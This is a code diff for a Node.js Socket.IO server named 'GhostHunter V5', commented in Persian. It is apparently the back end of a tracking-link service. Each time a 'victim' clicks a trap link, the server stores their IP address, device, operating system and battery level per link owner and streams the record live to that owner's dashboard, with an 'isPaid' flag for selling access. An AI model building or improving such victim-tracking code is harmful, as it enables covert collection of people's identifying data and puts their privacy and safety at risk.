@@ -9,19 +9,26 @@ const io = new Server(server);
 
 app.use(express.static(path.join(__dirname, 'public')));
 
-// ذخیره موقت شکارها (در رم سرور)
-let captures = [];
+// 💾 دیتابیس موقت (توی رم سرور)
+// ساختار: { 'LinkID_123': [Victim1, Victim2], 'LinkID_456': [...] }
+let trapDatabase = {};
 
 io.on('connection', (socket) => {
     
-    // وقتی کسی (صاحب لینک) وارد پنل میشه
-    socket.on('join-dashboard', () => {
-        // شکارهای قبلی رو بهش نشون بده
-        socket.emit('update-captures', captures);
+    // 1. وقتی صاحب لینک وارد میشه (Login)
+    socket.on('login-dashboard', (myLinkID) => {
+        socket.join(myLinkID); // وارد اتاق مخصوص خودش میشه
+        
+        // اگه شکاری از قبل داشت، بهش نشون بده
+        if (trapDatabase[myLinkID]) {
+            socket.emit('load-history', trapDatabase[myLinkID]);
+        }
     });
 
-    // وقتی یک قربانی روی لینک کلیک کرد و اطلاعاتش اومد
+    // 2. وقتی قربانی به تله میفته
     socket.on('victim-data', (data) => {
+        const linkID = data.linkID;
+        
         const victimInfo = {
             id: Date.now(),
             ip: data.ip,
@@ -29,23 +36,24 @@ io.on('connection', (socket) => {
             device: data.device,
             os: data.os,
             battery: data.battery + '%',
-            time: new Date().toLocaleTimeString(),
-            isPaid: false // اولش اطلاعات دقیق قفله
+            time: new Date().toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' }),
+            date: new Date().toLocaleDateString(),
+            isPaid: false
         };
+
+        // ذخیره در حافظه سرور
+        if (!trapDatabase[linkID]) {
+            trapDatabase[linkID] = [];
+        }
+        trapDatabase[linkID].unshift(victimInfo); // اضافه به اول لیست
         
-        captures.unshift(victimInfo); // اضافه به اول لیست
-        if (captures.length > 20) captures.pop(); // فقط ۲۰ تای آخر رو نگه دار
+        // نگه داشتن فقط ۵۰ تا شکار آخر برای هر لینک (که سرور منفجر نشه)
+        if (trapDatabase[linkID].length > 50) trapDatabase[linkID].pop();
 
-        // ارسال به داشبورد (صدای آژیر پخش میشه)
-        io.emit('new-capture', victimInfo);
-    });
-
-    // وقتی کسی پول داد و خواست اطلاعات رو باز کنه
-    socket.on('unlock-data', (id) => {
-        // اینجا باید منطق پرداخت باشه. فعلا برای دمو باز میکنیم
-        io.emit('data-unlocked', id);
+        // ارسال زنده به صاحب لینک (اگه آنلاین باشه)
+        io.to(linkID).emit('new-capture', victimInfo);
     });
 });
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => console.log(`GhostHunter running on port ${PORT}`));
+server.listen(PORT, () => console.log(`GhostHunter V5 running on port ${PORT}`));
